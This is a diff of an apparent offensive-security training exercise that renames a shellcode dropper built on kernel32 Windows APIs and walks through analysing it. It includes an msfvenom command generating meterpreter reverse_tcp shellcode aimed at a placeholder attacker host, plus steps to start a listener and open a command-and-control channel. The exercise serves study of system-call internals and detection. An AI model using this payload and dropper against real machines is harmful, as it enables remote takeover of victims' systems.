@@ -1,19 +1,19 @@
 ## Exercise 3: High_Level_API_Dropper
-And we need to make sure that the shellcode thread completes its execution before the main thread exits.In this exercise, we want to take the first step toward creating our own direct system call dropper. But to understand the principle of a legitimate syscall itself, we will start by creating a **High-Level API shellcode dropper**, or **HLA-Dropper** for short, based on the **Windows APIs** loaded by **kernel32.dll**, which will serve as our reference dropper for later modifications. This means that in the first step I deliberately do not use native APIs or direct system calls yet, but start with the classic implementation via Windows APIs, which are obtained via the kernel32.dll.
+And we need to make sure that the shellcode thread completes its execution before the main thread exits.In this exercise, we want to take the first step toward creating our own direct system call dropper. But to understand the principle of a legitimate syscall itself, we will start by creating a **High-Level API shellcode dropper**, or **High-Level-Dropper** for short, based on the **Windows APIs** loaded by **kernel32.dll**, which will serve as our reference dropper for later modifications. This means that in the first step I deliberately do not use native APIs or direct system calls yet, but start with the classic implementation via Windows APIs, which are obtained via the kernel32.dll.
 ![_level_dropper_principal](https://user-images.githubusercontent.com/50073731/235367776-54229a66-f1d6-4b8e-a2a2-7bb81fecbf48.png)
 
 
 ## Exercise 3 tasks:
-### Create HLA-Dropper
-1. Create a new C++ POC in Visual Studio 2019 and use the provided code for the HLA-Dropper.
-2. Create staged x64 meterpreter shellcode with msfvenom and copy it to the C++ HLA-Dropper POC. 
-3. Compile the HLA-Dropper as release or debug x64. 
+### Create High-Level-Dropper
+1. Create a new C++ POC in Visual Studio 2019 and use the provided code for the High-Level-Dropper.
+2. Create staged x64 meterpreter shellcode with msfvenom and copy it to the C++ High-Level-Dropper POC. 
+3. Compile theHigh-Level-Dropper as release or debug x64. 
 4. Create and run a staged x64 meterpreter listener with msfconsole.
 5. Run your compiled .exe and verify that a stable command and control channel opens. 
-### Analyse HLA-Dropper
-6. Use the Visual Studio tool dumpbin to analyze the compiled HLA-Dropper. Is the result what you expected?  
-7. Use the API Monitor to analyze the compiled HLA-Dropper in the context of the four APIs used. Is the result what you expected? 
-8. Use the x64dbg debugger to analyze the compiled HLA dropper: from which module and location are the syscalls from the four APIs used being executed?
+### Analyse High-Level-Dropper
+6. Use the Visual Studio tool dumpbin to analyze the compiled High-Level-Dropper. Is the result what you expected?  
+7. Use the API Monitor to analyze the compiled High-Level-Dropper in the context of the four APIs used. Is the result what you expected? 
+8. Use the x64dbg debugger to analyze the compiled High-Level-Dropper: from which module and location are the syscalls from the four APIs used being executed?
 Is the result what you expected?
 
 
@@ -33,7 +33,7 @@ The easiest way is to create a new console app project and then replace the defa
 </details>
 
 
-The technical functionality of the HLA-Dropper is relatively simple and therefore, in my opinion, perfectly suited to gradually develop the HLA-Dropper into a low-level dropper using direct system calls. In the HLA-Dropper we use the following Windows APIs: 
+The technical functionality of the High-Level-Dropper is relatively simple and therefore, in my opinion, perfectly suited to gradually develop the High-Level-Dropper into a low-level dropper using direct system calls. In the High-Level-Dropper we use the following Windows APIs: 
 - VirtualAlloc
 - WriteProcessMemory
 - CreateThread
@@ -114,8 +114,8 @@ And by using the Windows API **WaitForSingleObject** we need to make sure that t
 </details>    
 
     
-Here is the **complete code**, and you can copy and paste this code into your **HLA-Dropper** project in Visual Studio.
-You can also download the complete **HLA-Dropper Visual Studio project** in the **Code Example section** of this repository.
+Here is the **complete code**, and you can copy and paste this code into your **High-Level-Dropper** project in Visual Studio.
+You can also download the complete **High-Level-Dropper Visual Studio project** in the **Code Example section** of this repository.
 <details>
     
 ```
@@ -164,7 +164,7 @@ int main() {
 
     
 ## Meterpreter Shellcode
-In this step, we will create our meterpreter shellcode for the HLA dropper poc with msfvenom in Kali Linux. To do this, we will use the following command and create x64 staged meterpreter shellcode.
+In this step, we will create our meterpreter shellcode for the High-Level-Dropper poc with msfvenom in Kali Linux. To do this, we will use the following command and create x64 staged meterpreter shellcode.
 <details>
     
 **kali>**       
@@ -175,7 +175,7 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IPv4_Redirector_or_IPv4_Ka
 <img width="696" alt="image" src="https://user-images.githubusercontent.com/50073731/235358025-7267f8c6-918e-44e9-b767-90dbd9afd8da.png">
 </p>
     
-The shellcode can then be copied into the HLA dropper poc by replacing the placeholder at the unsigned char, and the poc can be compiled as an x64 release.
+The shellcode can then be copied into the High-Level-Dropper poc by replacing the placeholder at the unsigned char, and the poc can be compiled as an x64 release.
 <p align="center">
 <img width="479" alt="image" src="https://user-images.githubusercontent.com/50073731/235414557-d236582b-5bab-4754-bd12-5f7817660c3a.png">
 </p>
@@ -183,7 +183,7 @@ The shellcode can then be copied into the HLA dropper poc by replacing the place
     
 
 ## MSF-Listener
-Before we test the functionality of our HLA-Dropper, we need to create a listener within msfconsole.
+Before we test the functionality of our High-Level-Dropper, we need to create a listener within msfconsole.
 <details>
     
 **kali>**
@@ -214,7 +214,7 @@ Once the listener has been successfully started, you can run your compiled high_
 </details>
 
 
-## HLA-Dropper analysis: dumpbin
+## High-Level-Dropper analysis: dumpbin
 The Visual Studio tool dumpbin can be used to check which Windows APIs are imported via kernel32.dll. The following command can be used to check the imports. Which results do you expect?
 <details>
     
@@ -227,16 +227,16 @@ dumpbin /imports high_level.exe
     
 <details>
     <summary>Solution</summary>   
-In the case of the HLA-Dropper, you should see that the Windows APIs VirtualAlloc, WriteProcessMemory, CreateThread and WaitForSingleObject are correctly imported into the HLA-Dropper from the kernel32.dll.
+In the case of the High-Level-Dropper, you should see that the Windows APIs VirtualAlloc, WriteProcessMemory, CreateThread and WaitForSingleObject are correctly imported into the High-Level-Dropper from the kernel32.dll.
 <p align="center">
 <img width="693" alt="image" src="https://user-images.githubusercontent.com/50073731/235369396-dbad1178-e9a2-4c55-8c6a-fdc9362d864c.png">
 </p>
 </details>
 
     
-## HLA-Dropper analysis: API-Monitor
+## High-Level-Dropper analysis: API-Monitor
 We use API Monitor to check the transition from the four used Windows APIs to the four corresponding native APIs.
-For a correct check, it is necessary to filter to the correct APIs. Only by providing the correct Windows APIs and corresponding native APIs, which can prove the transition from Windows APIs (kernel32.dll) to native APIs (ntdll.dll), in the context of the HLA-Dropper, we filter on the following API calls. Which results do you expect?
+For a correct check, it is necessary to filter to the correct APIs. Only by providing the correct Windows APIs and corresponding native APIs, which can prove the transition from Windows APIs (kernel32.dll) to native APIs (ntdll.dll), in the context of the High-Level-Dropper, we filter on the following API calls. Which results do you expect?
 - VirtualAlloc
 - NtAllocateVirtualMemory
 - WriteProcessMemory
@@ -250,20 +250,20 @@ For a correct check, it is necessary to filter to the correct APIs. Only by prov
 
 <details>
     <summary>Solution</summary> 
-If everything was done correctly, you should see clean transitions from the Windows APIs used to the native APIs we used in our HLA-Dropper POC.
+If everything was done correctly, you should see clean transitions from the Windows APIs used to the native APIs we used in our High-Level-Dropper POC.
 <p align="center">
 <img width="498" alt="image" src="https://user-images.githubusercontent.com/50073731/235368737-9f87f5de-0a7e-4039-b454-2af23914b277.png">
 </p>
 </details>
 
     
-## HLA-Dropper analysis: x64dbg 
+## High-Level-Dropper analysis: x64dbg 
 Using x64dbg we want to validate from which module and location the respective system calls are executed in the context of the used Windows APIs -> native APIs?
 Remember, so far we have not implemented any native APIs or system calls or system call stubs directly in the dropper. What results would you expect?
 <details>
     <summary>Solution</summary>
     
-1. Open or load your HLA-Dropper.exe into x64dbg
+1. Open or load your High-Level-Dropper.exe into x64dbg
 2. Go to the Symbols tab, in the **left pane** in the **Modules column** select or highlight **ntdll.dll**, in the **right pane** in the **Symbols column** filter for the first native API **NtAllocateVirtualMemory**, right click and **"Follow in Dissassembler"**. To validate the other three native APIs, NtWriteVirtualMemory, NtCreateThreadEx and NtWaitForSingleObject, just **repeat this procedure**. 
     
 <p align="center">    
